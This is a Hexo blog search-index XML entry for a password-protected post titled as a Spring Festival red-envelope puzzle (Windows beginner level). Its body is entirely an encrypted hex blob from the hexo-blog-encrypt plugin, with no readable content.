<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【春节】解题领红包之二 {Windows 初级题}</title>
      <link href="/2025/02/06/%E3%80%90%E6%98%A5%E8%8A%82%E3%80%91%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E4%B9%8B%E4%B8%89%20%7BAndroid%20%E5%88%9D%E7%BA%A7%E9%A2%98%7D/"/>
      <url>/2025/02/06/%E3%80%90%E6%98%A5%E8%8A%82%E3%80%91%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E4%B9%8B%E4%B8%89%20%7BAndroid%20%E5%88%9D%E7%BA%A7%E9%A2%98%7D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9b25786706c8646cc9e4b46cb96a92b6c5c43673942ccc5ebc423a9bcd128bab">8eee5654709acd1a275cced06433ad0e1434190d2848b3cc11c243a71d3552a258bec4bc185d843ee0c602ce7ab19fdf7b866e6537111f64a6c8fa3470bb9384c9764babd1d0b1f102d72ae95d275f8ff599c3fceb15aa289303870e202507d8bbc9d2b3f160bb3c92a995338c2326087dcf494409071b21ae9664b9a44b0efd47fba06a855faa56cdbe77757402b432b33f4744187bcf9046203dcd5d40934e81d6eeda62cc4d0e613e8a69f974598d44bf9ad24358c761aa4d61649e8dc1a97607b7775b9d72c1e3718d22c83bc76c9b0a69ee11622d71965900445cc8b89c1e97e916aabf6b19db9268e4cc6e66c00605bbcd3a2ae126acec39318cea6b20ed3825d54b7272b8b0f86ee8123ee445cbb3f6e23a4c2a6c60ee401d27b5a38bec97a4b3f5fec829ee13cd731cc6800fc46480935441b6c044728a34a4049ee081df1fa51c0200ca1e0b12c33350e990f0fdde6c29ecbb721353c21b16c746cdfb9613c0c0e9ec5ac139eee712290e03c762c912d6cec0b271e59cb19ebfe094ccffdb8132986ee92d4cb92d4aaf325a5b146d77964b65725ceabc28aab25357a7c51ef7457e113b396aaa9cc54e8e75b77b4df4ffe4ddeb48eb7d774c0d1638555e59012589053452cb3428b7825f8c690ff5f8e844be8de84feea32a6008dd9ffe1a69a6cbbd532be803ef2e0a99e408ecc9a0865990a464f8765ed7f08ac46e7239a6d2053d215b1755b1ed89e1d5c158a27999c0c6a0cb8a4efbfc95c8add941077832a7fa3bb3f7740f2bef6d7ee117af836eff0e749b8e73e6a4cea8a78d8e76d811df2681321e46949afa5779cc4ada6482e18a6a3b0fbae3b415659a0d5cacff26ec201c93d1ca260691e8b886e633f5343a607960abbcac9ad82c5ce20853a5976a21ea2bd45270bcad474ad9b022c731479303c698a1144ab8abc47ec222f044e261a29abb592736f9ed52a4125fff7439148d6c92e99627479dc499b331df2f66cf33bdf5b60f30790c5f205701af350e7013aa59edc043356a55e878f06019bf1f5c34101b19607099afbe44676c6cea4b12d31dc6309847d2116a7eb895a624e75fcd991697509a79de38085f917658c1e5100077519742dd9f46a8cc8245061cac167d7fbc73af5c65cdffa26850239571ed9c72dd7211308b97de74d4cea9cd07148d41106bcb3d11b287157b45c0513f7043dee1fd47c7cc69893fa41c4f72ba4d6d6351e9917cc815978696d74d332ba263684b722965e138127319602c50776bcadbcdfa87a16c996e4cc5a507db9db3e51625d4f2c310d32845d11c60f6d8040e0b5577d2a557d03ac5f4a0a9fa25c50fbc3f362e72a2a9d4e747969728d1583f51622cb98692686ac5ad658f6c529edd6b4e1ac3f91625913cd9977122d1cb14a0c5ec27a3d7ce752914bdde39544e9e506bdbf388e03b1e9876ad88e918e73ff0d912e274340b460f8f6d5dbbd480c50b8efccb5eea8f268f333f29470b9e2d42126ecb76285683aa5053526a714f2ad7ab2d1930f605a382725b73da7fcd079c3b40a304069e9788b4f5cb480927c54ba0d22fb02305048f15bcff26021fa3b2668aba38bee76ffcdc279ae2576297917ecf638544c1356aefa81f84f949be9474dde9b7e6efc654643707c998fb3ab3b519f37c9be5e7ed0601435fde9757119d3000d1c9c8f174ef5f2abea25d6f81a8fe7a0aa921c93adfb271f2c150782d632d74726e2b0b0eff970e18be4394b72d22277e6dc64a02643dfc671123d59c27d45019f4214fbe86a58ff2c1314005d552cb52eb55489f607c28e877143ebf41959c68705e8b3982a27a76091bc66281fb93d5d864a1ec0d8051863b544128dd9fc7a5655676826fa1fbf4782e2b7d517209ad80b66643e7d4197a335b89511f1e9dffb47b692dc69128a1c73d81244d068661d98145aba68de6181b3a234aba370ed35e6c39d41f3d21687f2e120a09905299b67b72e4fa58a1be14f6830b8a50260c14958bdc378c2e75cffe58758549541316759433f24f67f315ba0ad3043c1b5e706971eb4156aa2cf7c8237254d51806289107aa3699bd195a563bc3de655a06b75fcbf1ea7198150c7c92ded8b4e2d99b753bc56c3b52c6e373ea1cbf16b687c31247986b1dff62d0f02c408c199782a6d6e8d9d65ebbbe0e6f612c34a97089709ab757cdbd9081a9d0783895308da9f873477e64174a20b0ce1928582df656fd68ee1fb4d5469aa2d233728ea7d23f461002139ca066a3ef3fd12a33c9d8d97c98dee6c1bbc533d9bc15868c335e0aaf4282de5f6b59acd2c32f68b4b57ec21a8e162f11983f4f1f4374d180328c579e164dd8507afc9394e4f8a83f467784416e9c06e4887a3ab84d2ca520b2f2f5527d53f59e2e75dc4309331e760b85be4a1e28260b09469ccc120b3305afb6b79fa0d55e1550918179f18be99d400adda01d275c823214e695cd28de6da3e31de3ea0f6eec66e278ef4fec2b262ea813cc63991cd4fa0930c5ffd94ee243fa63f600a57b4cb803e3d57a05dd46b11b1d597e81b826f77308661d8b9a061ad2bc471d44d43efb1a0fcd1080fbc3fed0a15d99a8c999bc6cfb65c30f46777e2dc529c58501ce4a57f60521398e3ae73904e0f09ed09a8e9aa4328c3a2bfdcc39f6ec2b1103cd7675278467db4ee2357a1574a5297b6b8b894486cbfa012abc0168a71d5d70f20c14e01ad19bf7df8be330466952e907317e945166b25be1cc97392208ce7ac01ae094913b7d557c8accad5bfd42dd85e7e4a1e5ed9cc4f695566153bfbba5f5adaad7ed10f738009e089b1fa0625109d219c504ae4e0993c13bf455ab7894b7367391d9ad0eb8d4d8023e3deacedcb2ab800ac520451db793fdca85d86284dc61aabc24f4d17ba4cb780e36e4579ccb381c4207e82d7f4447693874a08ce6bfee102a94e53036e19f93a207150d9cfaa66f18629e1c49f7f73990127daa309ff24b21592d8b84da78dff21b932de466e4c8c506b8848b9445602804fc0465fa14e04c692af093ae70075916a9edac625af6ea3a8aa73b17597b7eaf8ebb3912819996af64b035c37eb2261c81fec23a39665ba040b71a6b82f94efdd5d002ccf1fa5af8f42a7691b60ec6bb0b44cbd6c64306adc38af80a9581da788860268b65b34e8bf33f52c19d1dd988d32c14b5c42053457a5e8cc1520f5bf8844f5cbd060ace2317cc4697d4d387a3601a210d2344965499ee16b2a7d53bdb8db4248ae44c040cc7336ee856de05cfd4c9f03dfcb9f0544adb3b8e714cc926e34847e857543ea8fd57e7a1588f240f0908789274c43b0e77f9fc44732ef322219681c420deabb9fb1495aed3186c44294161b4e3f2993f4ec799fde10092476f7b8bdb6f10261fe90fe9b63f0f71b19c4d9486a1218478f3d28ea4398cacda78ab34278c9a7aa6c53a0a2a2449e2a0d327fa2427ce20b2a3a815baa048b82c315584446a8e51f98b5a76743c22f73e7d8cc9de71c9558d4f1ce7367e6da8a85d08f0f8c17df37279259298aa48d6d4c56f87c79b9f9aa0c8c6aba16f47c85167dfe324793c5564f05db52df5986da93bcdc14545327eacd19e010b02fc1b9a122acd3956b038db8bb040f9a56759166962e7b3e4cb8553959df2378fecaeacb13f80da23702a6be6888c978fcb40cf2aeabec0a000eab6a5b65936d04811061f771e476859168cd2cfe9df430de689528da990048f46b1956b2e0dbab77dafb6d5e15d371396d629be4e3651aaec5937e4532411ec09a2447f2135d384d9beda059a7cf43647f78bb98a284769dbc6ad32028136ad99bf7f873e061c5687ab4681635ca59b412440b6175c7b5d3c6a0f4a926c9acc2d189751b5af248567b21b04bc1386991d5725f7346cf37a978f911ddd3cea64c393fdd942eea9e1e44dffbc150857458be3bf11ab620858f109f9d5b7ccf191bfe120ca92323b1e6ddf1092b9c19850824d08f25728543f0e0bdea25f3a9e012778805bc492be98fcff54300d82b7be20814224047394787ce6f366ea113af42f375a9f96a547855fc1f48348bba76355a7e6bb8ac0ffc1925160a9fb09e670745031e493584e75d219c748ad04657127d654743681f2683095489c8bc28f9997efb0cca69e294f47305ae7ee61087bf1be24a74dc7005855a93a639fac3126796016996cebf927e6d2ce5a34aae93567238b7ab50d8ef2b961f97d3e68ec2f70ee7fcf4c7cc4138870aa872788716b90a6c9e784b6cae20aa9578a9de8c5884eca3267ac33ff1a59e2a6d71dce980260c18fdd7702584a33eee053ed580ddfa6e14ebdbef1c1cf71ea42e912f6cd46d62854f21617736f93b87a9182dfa6ffd9bcf9d2b19d7689e8df147bb595e8b9eb6ad9f0477dbdb881454511107c8cd3302bf7bab26f5b92b6a524b07e3b5a684ece21ef2eb4aed3e2d7c936638f7d2a9a2221b27b55f42d8b5c3691c7739afadde680f6a22cd72deddb61b285bcb0cde1a9207a7abdba51969af7b9862773eb847b02e1eb67f2c71e48b4aabd1ad8b3bb70886b4ba5c53c5c0a04bd11959be1c778dc3dbfd45cbb608520974bbb92f345f59a229c78750fb279c61b7c4ccf15829daee8440f03bc722804c3150fa1350952550bb08accb4cc059cda7c12be052efc17643bea61f5db9199856f71d0ace1847618eab25fe11a3ddb233ecefacf5a38c51d0310dbc200fd9e71e205b8a466e1979afd513bb3d70d06b35c75f55bf481bbf378a8bbe892b6a22fc21237518cb166db58e4c2b36d7ab95afd706acfc89c7462213370003c9d0d0bd4c95484185c5609992d3a1e1f8238ace0a7f61b7628bcb2ec6a93ef4bef7f7dddbd551d72aacbd1251381214ca3390aba8dd59f55f32ebb1959f4c4d244cccc75b402640cddeb3b40995b6ace1c0725787b82dd6176ce9c6b9f7af488ca4a1a0319e0ce839e10dc3a2f1d9416c9d4545c729cae66ff8089d5f873cf69606326c9f889bf38d179b88c576443109e2dc390508cbc0aaf480c968b89b778443b13714384239e01e949c48d4515c4ffc07c578185ac3ea8ba888e0d6d662e59dd2e5a213e30de8d4c378fb83887b0dade997cacd927909facbceb05f329249353d8c8c50e70b976fa871f58d2aca7fc165c0638d8227dddcce317803e5251e59d1435b6bbde0b21cfaac7ba2995792ee0b92e62718b7359040106b425cee5f8fde6ee40745eec7bb49e3d2195794403b02351731e98c1f79b750d5b2d92d220a4f76759c30958fb6a6538d33107f373000d3726cfcab37592de2b9edaedf411d872d4c5c0c65c4841b92a65177fe206dc03a37d3b478ba1925428883fab70b917f9c2c0c69826d459d2a3c3e32ae9a9a4e0e4333bc9212267937023d6be6549f4094964829306a143db21382b299e9e0538623a75151584d52d9ce5bf16a5f2f01a139fe52389a4be3209d1613a4e3d7448cf7c31f37a68ec687b5ded5ee37678c9cf591fa363acd34b87fb4f0a9a7d6b87310e102c5c1b5b923b03a5c9864bdc647ae8ada0e69c30e888d19ab77c33a02f18d390c4b72c070dd35183f376eb9edf30019a3cee4adf1dbdff8d708affc516e45b658d21a23a194b0480f388ef8d3565d9a304da42004a4649647fd2fe2f35f3e1a113dde99f632e60ab4cd020f0e94ef2022a0fff46b053bd70e12e086df789c46fa63d53cb37cf0f70e7a25a3b60872b883d110fdf13ee2a6176a2a106f96f0baa95156622e31cb24171503c868d46674742f40abc921afa34b5f83a26772136a60627f2c05e55acf5d29c0477f5d6d8eec6b71b2240a8ddd769319e9d0ba8401ad0a92686e111a53f0a84ccffd4a85896a33708fd167ff7de8bee36e210c8a27a9041951c11a18f7d5816d4f380111b667f379e0b5c23efccf0e6f2200b8254fd1b09c47f0c482cabf80756191e349779efbd92c68e2913e5b7e2dcdde9f3f8e84d18d6f5c11fa8ac629074eaafa13e7fadd184a040744908b29fd2d09cc613db521fcc971eedbe249ce009f03eb6fce3b21159d63901bd1eed8311d87c242ae34ed9600c6355f38abe5abb97768c60c88088b9743801c21e9f9cb017ed424217dc345c8d90c9eef437a77c1612cc9b927f96328b2cd5c56cfa022fc51790abae7b78f3506ef705f68bfb47312c4033c0c16bc8e166ee4cc02b1ce0a437404b8104e8b9eedcc3821c3ef135245b845a7e965e0a9df1e73ca23b2338facb2ab66a0c4d3930b68a1486ac47aa6e08172ec6896a6ff8d1395cc48b3c24e8f8d831981dbcda22fe1b1e44008b1e61781b08856b3d84566d390d9766db20d445b86cea6244cf1271113ce96741e2829ab8dfd2e6794300ccb1e12e0448c4b17dff01b736fee65351f0fce3cb4760418c3aa53af2ee7e6c638ec4a0cb460d20daa87e362b74cf8b44cc39d69c0aab0752f0147f6d275eeec253815925b3d2cb1ceb2b48940cc9ff0433c6421c98d4e6f25936666287b78bc3ac2a960923798c1ec0a7083dcc393e19ad804276743a8ad3bcfcbbc9377bc75297b6573fc6267072f50ed0d1ed453aab9b25e0903a2026bdac854a5545ebb5313350c154be60f931c57f7b0365beb9c0887fe28843cf3efbfc2ddddf759ca2d0438ec363141e7719283a203b75c94d5c06bfafa0566b4467c6f5c37c609aa59a574af83cb6341d1581e4e1a5fe457e18e7aca84c7e4aeec034348f972fb921e73e2e984663325f0a96e846f3742f88c9ed88cde60c9317be827173e498cdce95aa6da5f5543eb23159badad05a925f3464103f01369dfc850ec2adf3db0acedc00a1f10c9cebe67fda7cc4013ac96acebbeab7273d86a4ba02e1c5ceb07c79f98959a444cdfe139f9e22f5a71f22ccad07bc303febf1407594edd974f8a16b04df4b0f8c3f910e71be88df702a37a83751592246820ed4ddc1d4c93c21a8068bb7cf82014f8f558f7ace47b59f27b5451b7b503fef787be677e1b38fbfd328c30aaf9294124b1fb170fde8af3d79e526b34498a01262c8f820d85a39d72fcd0340a38efce9c4333eadb5cc0afe1198fc7639608be3c7a03b25c3654dd928850f4438f6f641e39c2862c550644becd74af261650bbe558b3b73b277906a9feb83b99e86913db137a2dac234bbb074e3af15d50ffe416af6a30ed7055f3a9d32bdb39950bcdb0e6c3640b3dcdcffe4b03783f3d0e551dfd02133e37d5ef703c1e45448605228ed373bd985ef7179b80bf908c50ce99ad705a3d655e007b32522e454dca487265177fe1772e20380584d874f5fcd02f8faa65e3311067a4eb2868d2854834fcb7f9b6722c69fad8cb394428aab41b639b31da1d2ccdf69654a434114da70c9915154969607b6eb874bbdfbf6d8fef72ec8de00d971056284760318c6bdcc96a2f914c8c68677ba419981a50acb94e24e7a7c6d03419d1c7dd031f5d5fd790ac13b94160c2a84ac4c51abe295944551e5aa712edf0398e9642fdb1839e0e1aed0ec6a53bc32acc929101f2c9294db071c601697198b9add5a0c649195187823ea9e32d99ea00ca584d05abb96a71b152d7298cd4b87af13da0172467180ebb9397a574e6b1100945160ba69a2769888438eb03b8c2cfcc55d0c75ea0fa008cfaa65928d50cd9ee763244e012a3fecd993d4c68b768ad4ef364ca75f1f740c18811f93c01c27084da605f32a182db1a6e3cc2a92231d83dbec15b3d0df4c26cb896143058136126cbca68c197e2e0d6564642e1e87515abd0f007583dad619ca9d40f5c5498cb774d999ff05ca9065902a6ab5e77f4907f56b861bee6c27c7d2d5479e5ec734a6c0c7b259da5db392cfc71dda8f48a9bc71d12f43b822af48568aeaeeb76dbd0343e9ca2af94603d3723441fde6ff522adc15198b28129b129d046774acfa08ac0e1afca75276c903d8ea14e30d9ade4c678c3d58aa70c47b6009fc674a86706b0c0acb6453d076f1b79e1d5a16bec79b8c61fe9b57a59d8c5d62dd8048bcc2dec2dcf60f64533226a0a727a0b85ff5fb505402f2e92e6b5e15b87d89a78158e98209a086aba0d7849a102331071a3d8ac38546a1e3694b04172199b0363de29e1f31254f726e820472e9df51efdbfc75d107e3a93a6e5bbbf70f12d473388f37c93a88733bc10efd20827bc1c05d39c766bd28cd6d132761900d98dc8c2eeb9406aaff5a5f2e4a8b28e414279017bba24eb35c866b93fec0c2a25f1eb4748794f13f3c019c95851100c4e0c1d9aa1100639b5e68dcccaaf2fd3c0551775f648e120476f85f68c93883621b54c18f6c892b99cee5d1004d334be4f13b63659476d5dac261c449790f1961db778195c8bdaa36db06da1722f9acac767fcb68df87ac749ff865848af020c31ff8893153fbf394547d7376ed7b5c18647b9433d9f5a73894b9007974bb2616125f7137eeb1fb540ec8d688f0b478ecd3d0450d9a80a9259fd6973bc1a589ce9b973aac9935a14879e1a084b10bd63566609b980784e8d591c786601a47a4df7c0fd9927ab5b35a1aaa320652768c9c708de6c7bf8a88f311121bd19a8090b1568d3ec225112e73ea66e63d856e4937522c80afada697ce2fbd3215974c3be889a1ac5c72f72e593a256d1915289d4963e5f6beafa85850172e04279a9a467940946955864e8181d1b1935ef86f9f87d23ff3cd4d7314fa7bd024c03ecdeca99fe829825f66bb8dba632c9835187ee37875d716474cc2eb6b9debe9a7ab6583ee309f9e4a6ae7b03ff2457477e28f9baeddcf64c01e62016ca775ff4c7aa6b80fd27b366ac9984818c031467a3e8845f36a9f0026eb895f4a08a7c7dcad9eb9a40aba5de1721272ca5a2cd4db1d346e1a84d196559425367972f79baaf4a1c4523cc6bd98a73004b017d9cb0a8752ab0e4ad23ed3ca66807d43f6f82e86296d705537347f22b5694f2026377872b722cdffefcc7799b09c05894f78eb4cba7ed6f7e1fbcf75d73d4bac3a31b5abeb402cbd9c72bc434ddbbcc455674f709ad25b237eb4f5bf29a85c5979c43288d52cec2f9f40ee232db4644699f1eb5f5aec757649812738ba4d4dafaf6935d324b6749e3e91fde195646ac08446eb4b75f732fc7ce4eb2a0f445b333954d6dde7c054e2d0a8cd2db4634772be2746c6d65b5361aa894af93d7e4c11dbd534e22c3abdc595f9c309df56231c868dc724a5efff9d337e3e3055ff4abe1c6a8d2320189689f971d892cf925bd3a76dfaf11cbfe8bab167eaefc5def7600c37c9aa781501c7b6c7dc4d81e66242c7aa5a283b5e6cc6bb44f6ee59d263edeff2396138284b4d00b8b84e478666b7de91a8d31942f5eb65e09465377945baf6a33502385c1d166511f6fe47ed5e125daad989d644a2e630f4d32c27c6183371dc3845a6ba79aadc90c00fb74c99b01be6c87bed9cdbf8f135aa4e754dcfcffb566fb946521ec57ca3bc350caf340b69b3321c54d4da86af80e0dfa5ea593b05360a41e4ab30f93a979719781af5e2c77468baa377f3c6882e37dd0e497c56e23bca1b8146555d6dc2d52b16e841f6bf4e6d1230e823c84d8f1b1261e0ae665b466ae2a733678e7027ccc58c201b0f90b71b8cdf818cc41987a15f42fd953da917f400c255df9ae056a7359e5264e1abe80d3e75723e9c96d2eb46000157a28fd5345cd336f913fa66f2853d2212dc5fce6ffd65e2fb829aaa163c361994d4999a01fdd7e13d1e97eb3dd4254c9d7ebe923629d762847d70cfe286912d0813f559477ef2cedd99234cf20ef3082b9305402ccc4e292b7e311434112c9cfcadbc99327b20e114c4ede091e12d7bae0ad6963a1e074f38cc33c96bbc77eb83a9fa6bbf10f7f7f0ae73ffb0cd374e67670ce09b481eeade44c6f990f8a991b094bd8cce0eb48d28872a01f7d42113339be2157e4db61ab716be762900feccc0c665ad690f7d558745feb5565214d786c15ee0d2ebf7122646a9669071d3f00e8d02b229eed4d665cd1964800b9780e18fca55b47d9cf21470b3ed5e204b3ac0a55cd57a40d6cee0305abc0a479499eb7c8ff4406855c6ef616113e7ce9e59080d49a343ee790aa7c4197e081f2d29703247b49d7d8b34e001ba121c3bf832c1981170ed5a99768d8376cb511ba1e8c31834c10b5e6d5c611b658a6ece88f851201e01bdc82f4c69e0f49a50da21ba09aa9d2be65c366f9afb6df4803202f47a38ee612d479e4f80c24a1894220a6f628614e37951fb439c9aa515f8610f53d7f8e9dad99037ee3c1fcee0b829f5d3278c00f0d8d50cb03f74060832ffe8be763e7dc43eff8b28bfb099fa30e6edbbcf146281a32357529813a703fd6346a79e5095545bb4bcf9abcfb84c1fd81774cffc517e8cbbad17287ca8f0d20bef02cee78163c90e96ed5da249a92d1dffb99ad7f763e5d988ee789ff6845ae91aeb755e0976624dcf29c780dea2e8234b57ed652ec7005ad7f66027701c16611ced2cc4e0044fbc2d32f7af17872dd8b429a2beda3b1ae3241725323bb2b0a1b9432d599a8e57cd8e54b3aa80cf33d12393f9274520a6930385df0284aab1a08f7b8d35663d7dbb7e6bf20b72478ff88b34247a900e141f5f88eb1a1e4b7f76d1ad2609a6737ed7ce7813893a17ddf4c046c490144d5f512494105fd51b601ee630e39345736b99f58e6f8386b8c99238e3652eb365e9a18d201fa4e26567970653f1818ce3301c834671cd70fef5fd53d9f7fa0763db986cece2a861182f238ada0c0d8fc7303d4c5a59d8616f4c673a0c815fc856914af4f3a85df1f26251bb98fe7ff730c048faf45e8ad65b403c34512e2ee786e240437410c8393057c9cfb0827e6cc16595534eb9ce94e8f24d4424f37f284c6c0de52107cf37cf360ade0b03bb51606d873364c8f6332ef44621ad990ca5a69d91b22e9da8415944d6b515df54af0c24638dee42b9d4226a0f7b84ea226e027f089cefb354b3aefda1537c5b72338bb750c6a3f5ef2753ca2584e491771b1d51f882496526bcb19f42948c7a183bf37ba1fdbca7825bc6085248af53133c10884759f05345f146609276e3ef347c9f335d707d3d61891ccc50375b032935927aa5af248366a72d3060dadc54472521ee9b10b541120853f0960e1510730650a054fa3bc76a60a96708c2a3ba7629d611fa04f515fea642db2a9a1f36e29e99016aacbb9a40452d435d8038371400326005ad4975c2270eb7e64e84e1f888a4a491fa8c0862461787372391693bd6c30c236a2413587ba450f01eb304f1c34509549ae73d9919ef8c312bb3593c26afde4a793728059c25a2f74de386cfbf62afe3f80f93e1c66ad0b3ba82d0c924b455cce0361ad4a33dbe7281635ef939c1b21e28dcbd31885b89a9cb40f9469d286c058b010119b4b7e841166b68a85ea5a23a6dbb7d9ec406832cbb9d4e51449764b4f5d54715c10083701a607c084ceb9191d12fee35f34ab5305b728851294bf0d4cada2b8265f8369946a622fec765a3043afbd6024b4ac38ea4435d0e5269a9b84f3afea0187e8b72dd201f1081d8a58df90d368bac8549de2f5356706cc9df15f79e301090ab13cc07aabdedd036edf99fc6a91404811060a42236e4792e81f4a95cf27a7998ae9e622b3b7ce709a8ded9b334f52468dc048238b39df15252427c7c0a943c40292e414f18ba48889c6c042400e862132ec675677dcef07d506baa13e4ed7678f6dd47962aa83fa6dfc5a10eb697ac4b3de2b67703036b78475d5d3ce77fde76267d9cc33053148688adc3877b0ae3c537a3bc6d094c31602cbccd038fca39e4301d9153a5a390656e81826066de962c9cab95567051d2e24ae76be86d951840c28c5a0adf53d45853739f6957332d8b1161b96ba3d5dab11880f85ab11da614f51bdbbb406b8b5dcfc0c53801a9a2ad235b8d99c3b7425437809016308b1511386382a23e0a24c1388736af7599d258ea483f946bf412a5542063523c175d4895517f477d46bbd35ef2618d7e6b218b06ccbe30ad9096372801a3e3cb008bfd222d74f8298aa409a3063de79fe36d8f62edf247c366e93367746ae1297d215d860127d540b08b6879040ba06f13226a9a44fe799176a56b8a7ed44067b1188b147a6f689c927878551066d1a0a54ab7b4d83e7a5759b4ef7485a7e6e6dd341b601599da330a90ff21714385a746db46a7fffdb2bc778009aaf78a75aad27670af573740efd702f482ff98f02b7ea9d2f3505874f1b1d195166cbfe53e085d253688f5978e2fc6e04bd20b917fa7704bbd40407607a4280b35592a3c86c99ad552011dfce2e561ab53fb7ad15d6f409a5b4d42311ab6c3e1e26d0be92ccc134b13c41eba11a645e98c3acc1608e4a742b05255ae54e832b1cc60b53228e3c82630f97719208a63f3b2545f342594435b8ed58f7cc6f4c4f9abe3a30a76c3fcc34f374aef7fd97275b8643402866090d2128f3d88ef4caa9b2cf21e20fe8cb915e658f8b02cec8dd611c0e3d34d30f5045a4cbc250b14bc9f6b7bde8a878762a73be7943a4df2602bde080b587880f051eb84ddada0dda9896f56f5d180801809abe3e6e656c3b9040717d9502c2faf572dfbb3a3efcfee496f093a0aef755ea63e1a625b9df6af825fba6c631b9002d5f0a8be59443d67ad03885e78ad2cf2959cd2e8d299c8eaf80412c807be2ec380231dd6593dd21019d684f92ba666c67cf5e91bbaeefc271f423a513b1f8aeae920915f2ae17df481b0ec07eca50ebc8f7b0374d88cb0d031cbbafd53fa72be9c92184b5fe0151c4baf0ff2122dec8a4c03ee8091aebb7fd76981af716df688d93c52ec7ce63ec1da0f6fac5800fe3916a9fba90e73f166d5cbc597d49e34b8c102a4ec10c12c4f01cfd8a20185e45d1330523fa8a6362ffcf98248ccf5f178bc85892da7b1c7b20231b121f222b902dd46f4a3d65b45b1b26c16582e5b3a6f268737a05250ac4046dd2b7d79d07229724a3902b9d6bbe237fa8ff456b325a7196777c80bca44b74359339139bce7fb97b11220a38b9fb45d16ce3979e4ed925b40fc18a72e630b705dfb4777527d24df3f15d7b0c016b7bdee5c4104be1b3738d61716ac27941cada095c54ea95fd3fabf7b618bcde27406f767dc369bd92151afe6568dfd176dcc76aa1c48ad6ceb843344a5fc44776f2afecb0e00b7d068946cb881f47a3a5e1e2b01bf12ebedb7a5e7064dfa5f4bfed898899ba26d0ddac1ce54bada0fa69d549593048dbb5e21b7f371494a12e1440066c01a914101961dc9dd85665046cb2498271e05c57f83c458a671dc0dc3ba231e0e9107280753c00378c33bfb0255cc44768e86b5199c2b1ae57e6b7aff67a28ed262392fe7be53fe1681c1b8edb2eaea39bf8e73b868929d2f8c03e41d18fc00437f8eeb41d5103484aa7edf533efe5fcf6d2b759bd2192f6ae7a93477b9eb9dec5867d3269e5de39b8e89bee66aa1620d6258a19e94378cd9610ec550511237f7f56e2b9a86ef20d68c9c1a7df55a5eac3fb89d059f4810e160d801b3dc46390e24831cdc8547409336bca04c943c568716a7f7a730beaffeb8b150df8260e6e1a5eaca51efcfb1cf7a9859cb1dab7e89919ad5220dff2da30b5a4c9e2a1ededf54ca63e4692627f97072421fef4f45d709a4f9e14455013a7b0cb6c1c605f3a8c529c78bafbd87571564f7f57a24ac238970ce6ec33e3c81183a8ae8fb64aa5824011ca8ccc18e9f1619efea7df023b08d0cdfb0bff976464b40202faf5cd3fa4e6c6f2bedd8e8e75479ac69b9cddd4605fcbac615a6a753c122dd382e461afff17297db6e8000722a85363124b13836c11eac79cea411c6c09a9c282e35293612e22ff12e0e6bc9d88881d4d29e53487859c32e97789639b80e6336bf48c23d33d5ec46d8fc21adf251a817dec33763ebf70041983c068abe39ca69d854818af35d2f8f22b6a15b4b8f8a84da3732e61a322427b7a82971fbd40268062cfdd1dbbef3526aec2f6cccf8ed1fba2600535c6c90a2e7b0027ca5b95adc2206f43b591a60d138a7e954e0bd4010b313bf3aaa5a9b851d9f60dbb6ad4be53ebf407d39bb2fdc357687b9a465b3eb79d176980c2c3c52a1b42b2218a0bb416d96442a7bbc1032031a19a0081d2839f87af089dd6bee6702ab4109131872190c669a36eedf66dbbd3f2f112ffc5a20fde570e553a628e2ff027657c168a61527271ee0a71fed0a7ace3cabfd864b00aca938c9d0d77018df70ac1478ed7a2eef3a96a4584669a79c850e238cfbf33343fb0e4b2cba4214079f3b2211537948df3d738e67a4b640e9da6ee1ea7b30c3dbe05dfa5254160d76eaccb26a40d3093ca45da9f96b05aa2029c872f819264d73e1dab6981005562d718efbea482f4f15436ebbf712ff02ab4882c985954141d6fa40f47e0c79ddd6d750f0e7b1cedb62e115e72e5a0049c3ac499bb55ac5034bd7c155416eee9bda08e9665d4d0b648a7291ca36a18c6533ab479c2700c10a6099007f5fbbbd326978b388defe08f6e1aac2ac01b7fedbd1eac492e1b4a7b0fcc555476b3ceec028a2a37ad37b7892aaff76dd4e77ea0bb9196dae36540711800f9ab65cd270de52928a723e10031f5bd50c969e249ba389ecab454c4f2a2b9de4199897ba6c882dfbd640ced67193cfdebebc7e843358177e2e8cb00216d3e37ebdf2bfc4c56c19f5ebaedd110fc939e15b0b4160b9b16b4526e3f28b2059f072d7fb494eec84213d19500b803337e9cacc9dd897091668ec39c497aa96b8a74dae9cfd7f6d2175ae5b166a74aed3704ca6ae683198187dd81d0fedb28699ab82a7989a94dbdc1cfec76f6587bf448054660d2227202b68710a8cf3b96c084aca2c4a78285bc45fffbdbed56fe241c793101b850d4a6af519ddb1801fe6fdd9577104c63a3e3cbccb25b755959e79e60dcd343c8b7078be56e2677e1d1ba3e23ec66795f8a44ab435040ac071bb0c7b2ebb679e33677f12aae1791eecfdcd720ef078fc16bf5ec24ab2f9f4f05cb2f60d8f29cdf801c671963f855e50fc83e4d0ee6e51e6c462b989fc77d4495ffc33fbc809818e33d09c5b8a61ad868fe6cc89b8b70aef7d6eb51342b0e798ed5bac1d5802c860f6420424bd1562edb23e109b57af743a72f13140789f5cd00a7ec45306427096f0984e91732552c231faa5358d962c6bdd9040ccddbe730aba092b10141e2c6b711cca87ba06557d27cd1c4cd6da2e3299a0e88466f608212a86681884081ac60d72333c8c62181b0fa84196ca140b01f5a7d64a95c7466e4680d00b380894ddabff8da99bc5582a8e7efd607c3f22a74ef7b19cbe79c5df905634923c5aeeb64508459f7c41f17bdc3c1d62a097ac584130fa09ee246175c662d69f4c393aa9c36cf08fd656d0d0772a5f76faaa399fdb09289d277039722066759924d161ffe2512baf5f22f3d37ff7a107b60b76ca506bb506a3dfc310a713638c203b75a7e925d292c0998c211e4d098922e5268cb04c2924343e8eb901e5fd485316143ec048a9ea8d995e37a6f7c10b4f3e24a285df9891950520155e3fb136bc989a19160db49d20aca0d49b5a90d5b17513358e7b71dbec57b7bc9c7f2240e2448685d42c6ffe22ee41d192443af0dbfa474e98e4a5acea219df3e991846d0f4632f55c656a89a0ab669a14557349df7d926d650e8d90a6fc4899bd08f4ce846818dd9078b5d9c24310c44a2d1726fe7ac2ad00b1e88014d9efc1babe597d1663ce326fcc03b25dbb97606a6a9eb7407b4a0fb3a585f2a58a6865f6f1ff59acb84dcf5a3af28e168ba8e5b27ac140de87e7a67b0d3196df544a8a6b4997d